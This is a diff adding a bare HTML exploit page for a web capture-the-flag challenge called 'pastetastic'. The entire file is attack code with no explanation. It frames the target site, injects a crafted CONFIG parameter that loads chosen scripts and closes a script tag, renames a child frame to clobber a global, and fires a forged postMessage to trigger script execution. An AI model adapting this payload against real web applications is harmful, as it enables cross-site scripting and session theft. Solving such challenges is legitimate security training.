@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>pastetastic exploit</title>
+</head>
+<body>
+	<script>
+		function exp(ifrm){
+			var t = ifrm.contentWindow.frames[1];
+			t.location="subexp.html";
+			setTimeout(function(){
+				t.name="CONFIG";
+				setTimeout(function(){
+					ifrm.contentWindow.postMessage({type:"error",lang:"firstElementChild"},'https://pastetastic.web.ctfcompetition.com');
+				},800)
+			},800)
+
+		}
+	</script>
+	<iframe src="https://pastetastic.web.ctfcompetition.com/view/fd48dde3207a43a78c879f6faaee9bce?c=CONFIG={%22viewer%22:[{%22dependencies%22:[{%22integrity%22:%22sha256-sSTatLHEEY8GQrdYAuhkqrYogKZ/jDlgfYaqK3ld/uQ=%22,%22src%22:%22https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/components/prism-core.min.js%22},{%22integrity%22:%22sha256-Y0YX22e5n0zVSAd1tJ6aypkv9o4AEX5YcRKPg1Al8jg=%22,%22src%22:%22https://cdnjs.cloudflare.com/ajax/libs/marked/0.6.1/marked.min.js%22}],%22plugins%22:{%22markdown%22:{%22integrity%22:%22sha256-e4izlzFmEQlenZQnzkYK5oyxV5mX6lwVQjL6onkHiy0=%22,%22requires%22:[%22markup%22],%22src%22:%22https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/components/prism-markdown.min.js%22},%22markup%22:{%22integrity%22:%22sha256-8nT1E50WC5TDeb3+USsFEXN5ZGgLdmwZ6RS5KT71Wjs=%22,%22src%22:%22https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/components/prism-markup.min.js%22}},%22preload%22:[%22markdown%22]}]};%3C/script%3E" name=p onload="exp(this)">
+</body>
+</html>
